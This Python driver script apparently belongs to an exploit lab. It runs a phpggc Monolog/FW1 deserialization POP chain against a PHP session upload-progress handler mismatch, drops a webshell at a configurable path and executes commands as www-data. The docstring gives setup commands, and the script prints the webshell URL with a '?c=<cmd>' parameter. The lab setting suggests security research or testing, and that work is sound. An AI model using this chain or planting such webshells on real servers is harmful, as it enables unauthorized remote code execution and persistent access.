#!/usr/bin/env python3
"""Driver for gadget_phpggc.py against the gadget-phpggc lab.

Generates a Monolog/FW1 file-write POP chain with phpggc, delivers it through the
session upload-progress key (php_serialize write / php read mismatch), fires the
Monolog __destruct that drops the webshell, then lands `id` (uid=www-data).

Bring up the lab + get phpggc:
    docker compose -f docker-compose.fpm-avenues.yml -p p2s-pggc --profile pggc up -d --build
    git clone --depth 1 https://github.com/ambionics/phpggc /tmp/phpggc
    python3 -I poc/primitives/tooling/verify_gadget_phpggc.py --port 8121 --phpggc /tmp/phpggc

Run under `python3 -I`.
"""

import argparse
import os
import sys

_HERE = os.path.dirname(os.path.abspath(__file__))
_POC_ROOT = os.path.dirname(os.path.dirname(_HERE))  # poc/
for _p in (_HERE, _POC_ROOT):
    if _p not in sys.path:
        sys.path.insert(0, _p)
import gadget_phpggc as gp  # noqa: E402


def main(argv):
    ap = argparse.ArgumentParser(description=__doc__.splitlines()[0])
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--port", type=int, default=8121)
    ap.add_argument("--phpggc", required=True, help="path to a phpggc checkout")
    ap.add_argument("--preset", default="Monolog/FW1")
    ap.add_argument("--writer", default="/index.php")
    ap.add_argument("--reader", default="/reader.php")
    ap.add_argument("--shell-path", default="/var/www/html/pggc_shell.php")
    ap.add_argument("--cmd", default="id")
    ap.add_argument("--local-php", action="store_true")
    ap.add_argument("--max-tries", type=int, default=40)
    args = ap.parse_args(argv)

    print(f"=== gadget-phpggc verify  http://{args.host}:{args.port} "
          f"(preset {args.preset}) ===")
    ok, uid_line, shell_url = gp.run(
        args.host, args.port, args.phpggc, preset=args.preset,
        writer=args.writer, reader=args.reader, shell_path=args.shell_path,
        cmd=args.cmd, race=True, local_php=args.local_php,
        max_tries=args.max_tries, verbose=True,
    )

    if not ok:
        print("\nRESULT: FAIL - no command execution landed")
        return 1

    uid_ok = "uid=" in (uid_line or "")
    print(f"\nRESULT: PASS - framework POP chain executed; webshell dropped")
    print(f"  uid line  : {(uid_line or '').strip()!r}")
    print(f"  webshell  : {shell_url}?c=<cmd>")
    print(f"  uid       : {uid_ok}")
    return 0 if uid_ok else 1


if __name__ == "__main__":
    raise SystemExit(main(sys.argv[1:]))
